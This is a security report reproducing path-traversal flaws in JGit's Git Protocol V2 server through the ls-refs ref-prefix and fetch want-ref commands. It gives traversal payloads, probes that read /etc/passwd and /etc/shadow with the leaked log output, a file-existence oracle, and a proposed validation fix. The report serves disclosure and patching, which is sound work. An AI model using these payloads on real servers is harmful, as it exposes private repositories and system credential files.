# JGit Protocol V2 Path Traversal — Reproduction & Extended Findings

**JGit version tested:** 7.5.0.202512021534-r (latest stable as of Feb 2026)
**Server:** Jetty 12.0.16 / Jakarta EE 10
**Protocol:** Git Smart HTTP, Protocol V2

---

## What was reproduced

Both vulnerable surfaces described in the original report were reproduced.
One undocumented surface (ls-refs) was found to be more dangerous than the
originally described fetch/want-ref path.

---

## Attack Surface A — `ls-refs` + `ref-prefix` (no config required)

### How it works

`ProtocolV2Parser.parseLsRefsRequest()` appends raw `ref-prefix` values from
the wire directly to the prefix list with no validation:

```java
// ProtocolV2Parser.java
} else if (line2.startsWith("ref-prefix ")) {
    prefixes.add(line2.substring("ref-prefix ".length()));  // ← raw, no isValidRefName()
```

Those prefixes reach `RefDirectory.LooseScanner.scan()`:

```java
// RefDirectory.java — LooseScanner.scan()
} else if (prefix.startsWith(R_REFS) && prefix.endsWith("/")) {
    File dir = new File(refsDir, prefix.substring(R_REFS.length()));
    //                   ↑ refsDir = $GIT_DIR/refs/
    //  prefix = "refs/heads/../../"
    //  substring(5) = "heads/../../"
    //  new File($GIT_DIR/refs, "heads/../../") → path: $GIT_DIR/refs/heads/../../
    //  OS resolves at opendir() → $GIT_DIR/
    scanTree(prefix, dir);
```

`scanTree()` then recursively lists the resolved directory and reads every
file it finds. Files whose content parses as a 40-char hex SHA are returned
as ref entries in the ls-refs response, with the SHA as the object ID.

### Prerequisites

**None.** Default JGit server configuration. No `uploadpack.allowRefInWant`.
No authentication bypass needed — the traversal happens during the normal
ls-refs command that all clients use.

### Observed results

```
# Request: ls-refs with prefix "refs/heads/../../"
# (traverses from $GIT_DIR/refs/heads/ up two levels to $GIT_DIR/)

99c45eb71421e18bdd89f3e481799e938fd5a014 refs/heads/../../FETCH_HEAD
8ab84b7d2763b0803c3a212df63f04cf694276ae refs/heads/../../HEAD
8ab84b7d2763b0803c3a212df63f04cf694276ae refs/heads/../../refs/heads/master
```

The secret commit SHA `99c45eb71421e18bdd89f3e481799e938fd5a014` — stored in
`FETCH_HEAD` and never advertised via any public ref — is returned directly
in the HTTP 200 response body.

With a deeper traversal prefix:
```
# prefix: "refs/heads/../../../../../../../tmp/jgit-vuln-demo/"
# (traverses to /tmp/jgit-vuln-demo/ and recursively lists everything)

99c45eb71421e18bdd89f3e481799e938fd5a014 refs/heads/…/served.git/FETCH_HEAD
8ab84b7d2763b0803c3a212df63f04cf694276ae refs/heads/…/served.git/HEAD
8ab84b7d2763b0803c3a212df63f04cf694276ae refs/heads/…/served.git/refs/heads/master
0000000000000000000000000000000000000000 refs/heads/…/working/.git/logs/refs/heads/secret-branch
99c45eb71421e18bdd89f3e481799e938fd5a014 refs/heads/…/working/.git/refs/heads/secret-branch
```

The attacker learns:
- The secret branch name (`secret-branch`) exists as a file path
- Its SHA (`99c45eb7…`) — enabling a subsequent targeted `git fetch`
- The complete tree of git repositories on the same filesystem path

### Why it is worse than the want-ref surface

| Property | ls-refs traversal | want-ref traversal |
|---|---|---|
| Config required | **None (default)** | `allowRefInWant = true` |
| HTTP status | 200 always | 200 (absent) vs 500 (exists) |
| Data returned to client | **SHA values + directory tree** | None for non-git files |
| Authentication bypass | Not needed | Not needed |

---

## Attack Surface B — `fetch` + `want-ref` (requires `allowRefInWant = true`)

This reproduces the original report exactly.

### Prerequisites

The server repository must have:
```
[uploadpack]
    allowRefInWant = true
```

This is **not** the default. Without it, want-ref requests return
`ERR unexpected want-ref …` (HTTP 200) for all inputs — the traversal
code is never reached.

### File path arithmetic

`fileFor()` strips the leading `"refs/"` before constructing the path:
```
want-ref: "refs/heads/../../FETCH_HEAD"
  → fileFor strips "refs/": "heads/../../FETCH_HEAD"
  → new File($GIT_DIR/refs, "heads/../../FETCH_HEAD")
  → path string: $GIT_DIR/refs/heads/../../FETCH_HEAD
  → OS resolves at open(): $GIT_DIR/FETCH_HEAD  ✓
```

One `../` from `refs/heads/` only reaches `$GIT_DIR/refs/` (not `$GIT_DIR/`).
The correct depth to reach `$GIT_DIR` is `refs/heads/../../`.

### Observed results

| Probe | HTTP | Interpretation |
|---|---|---|
| `refs/heads/this-does-not-exist` | 200 + "Invalid ref name" | file absent |
| `/tmp/does-not-exist-xyzzy` (traversal) | 200 + "Invalid ref name" | file absent |
| `/etc/passwd` (traversal) | **500** | file exists, content in server log |
| `/etc/shadow` (traversal) | **500** | file exists, content in server log |
| `$GIT_DIR/config` (traversal) | **500** | config file read, in server log |
| `$GIT_DIR/FETCH_HEAD` (traversal) | **200 + packfile** | secret commit exfiltrated |

Server log (after the `/etc/passwd` probe):
```
java.io.IOException: Not a ref: refs/heads/…/etc/passwd: root:x:0:0:root:/root:/bin/bash
```

Server log (after the `/etc/shadow` probe):
```
java.io.IOException: Not a ref: refs/heads/…/etc/shadow: root:*:20466:0:99999:7:::
```

Server log (FETCH_HEAD case — no exception, object served successfully):
```
# HTTP 200 response contains:
wanted-refs
99c45eb71421e18bdd89f3e481799e938fd5a014 refs/heads/../../FETCH_HEAD
packfile
[packfile data containing the secret commit object]
```

---

## Answers to the specific questions posed

### "fetch does not exfiltrate data — find other code paths"

**ls-refs with a traversal ref-prefix does directly exfiltrate data.**
The SHA values and file names (including secret branch names) are returned
in the plain HTTP 200 response, with no server-log indirection.

### "if the ref really exists, does the server expose it?"

**Yes**, for both surfaces:

- **ls-refs**: Any file outside `$GIT_DIR/refs/` whose content is a 40-char
  hex SHA is returned in the response as a ref entry, including FETCH_HEAD.

- **want-ref**: If the file contains a valid ObjectId **and** the corresponding
  object exists in the repository's object store, the server returns a
  `wanted-refs` section with the SHA and includes the object in a packfile.
  This is a full, authenticated-appearing git object transfer.

### "does the endpoint leak the existence of a file? (404 vs 500)"

**Yes**, the want-ref surface is a reliable binary oracle:

- `HTTP 200 + "Invalid ref name: …"` → the file does **not** exist at the
  traversed path (or is zero bytes).
- `HTTP 500` (empty body) → the file **exists** and the JVM process has
  read permission.  The first 4096 bytes appear in the servlet container log.

The ls-refs surface does not distinguish absent vs. present explicitly —
absent paths simply produce no entries in the response, while present paths
produce entries.

---

## Fix

Single guard in `ProtocolV2Parser.java` for both surfaces:

```java
// Before reqBuilder.addWantedRef() in parseFetchRequest():
String refName = line2.substring(PACKET_WANT_REF.length());
if (!Repository.isValidRefName(refName)) {
    throw new PackProtocolException(
        MessageFormat.format(JGitText.get().invalidRefName, refName));
}
reqBuilder.addWantedRef(refName);

// Before prefixes.add() in parseLsRefsRequest():
String prefix = line2.substring("ref-prefix ".length());
String prefixForValidation = prefix.endsWith("/")
    ? prefix.substring(0, prefix.length() - 1) : prefix;
if (!prefixForValidation.isEmpty()
        && !Repository.isValidRefName(prefixForValidation)) {
    throw new PackProtocolException("invalid ref-prefix: " + prefix);
}
prefixes.add(prefix);
```

`Repository.isValidRefName()` rejects any name containing `..`, control
characters, `~`, `^`, `:`, `?`, `[`, `*`, `\`, `//`, trailing `.lock`,
and other malformed patterns (RFC per git-check-ref-format).
